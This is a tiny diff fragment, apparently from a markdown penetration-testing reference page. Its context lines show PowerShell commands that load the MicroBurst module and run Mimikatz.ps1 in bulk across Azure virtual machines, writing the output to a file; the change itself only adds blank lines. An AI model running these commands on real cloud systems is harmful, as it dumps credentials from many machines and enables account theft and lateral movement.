@@ -17,3 +17,5 @@ updated_at: '2023-05-28T03:59:38.880779+00:00'
 PS C:\> Import-module MicroBurst.psm1
 PS C:\> Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt
 ```
+
+
